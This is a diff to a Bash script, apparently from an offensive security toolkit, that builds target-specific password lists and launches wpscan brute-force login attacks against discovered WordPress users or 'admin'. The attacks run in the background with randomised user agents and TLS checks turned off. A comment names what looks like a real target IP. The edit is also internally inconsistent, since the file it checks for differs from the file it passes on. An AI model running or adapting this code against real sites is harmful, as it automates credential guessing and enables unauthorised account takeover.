@@ -195,9 +195,9 @@ then
 		path_web_sin_slash=`echo $ip_port_path | cut -d "/" -f 4-5 | sed 's/\///g'`	
 		path_web=`echo "/"$path_web_sin_slash"/"`
 
-		echo "Buscando company: (.enumeracion2/"$host"_443_company.txt)"
-		ls .enumeracion2/"$host"_443_company.txt
-		if [ -s ".enumeracion2/"$host"_443_company.txt" ]; then
+		echo "Buscando company: (.enumeracion2/"$host"_443-_company.txt)"
+		ls .enumeracion2/"$host"_443-_company.txt
+		if [ -s ".enumeracion2/"$host"_443-_company.txt" ]; then
 			echo "generando password personalizados"
 			passGen.sh -f ".enumeracion2/"$host"_443_company.txt" -t online -o passwords-$host.txt
 			cat passwords-$host.txt passwords-web.txt > passwords-web-specific.txt
@@ -287,16 +287,15 @@ then
 					#https://181.115.188.36:443/				
 					for user in $(cat .vulnerabilidades2/"$host"_"$port-$path_web_sin_slash"_wpUsers.txt); do
 						echo -e "\t\t[+] Probando usuarios identificados. Probando con usuario ($user)"
-						echo "wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web.txt --usernames $user" >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt
-						#WpCrack.py -t $ip_port_path -u $user --p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt 2>> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS.txt &
-						wpscan --disable-tls-checks  --random-user-agent --url $ip_port_path --passwords passwords-web.txt --usernames $user >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt  2>&1 &
+						echo "wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web-specific.txt --usernames $user" >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt
+						wpscan --disable-tls-checks  --random-user-agent --url $ip_port_path --passwords passwords-web-specific.txt --usernames $user >> logs/cracking/"$host"_"$user"-"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt  2>&1 &
 						sleep 10
 					done
 				else
 					echo -e "\t\t[+] Probando con usuario por defecto admin"	
-					echo "wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web.txt  --usernames admin" >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt 2>/dev/null
-					#WpCrack.py -t $ip_port_path -u admin --p passwords-web.txt --thread 1 >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null &
-					wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web.txt  --usernames admin >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt  2>&1 &
+					echo "wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web-specific.txt --usernames admin" >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt 2>/dev/null
+					#WpCrack.py -t $ip_port_path -u admin --p passwords-web-specific.txt --thread 1 >> logs/cracking/"$host"_"admin-$port"_passwordCMS.txt 2>/dev/null &
+					wpscan --disable-tls-checks  --random-user-agent  --url $ip_port_path --passwords passwords-web-specific.txt  --usernames admin >> logs/cracking/"$host"_admin-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt  2>&1 &
 				fi						
 			fi			
 		fi	
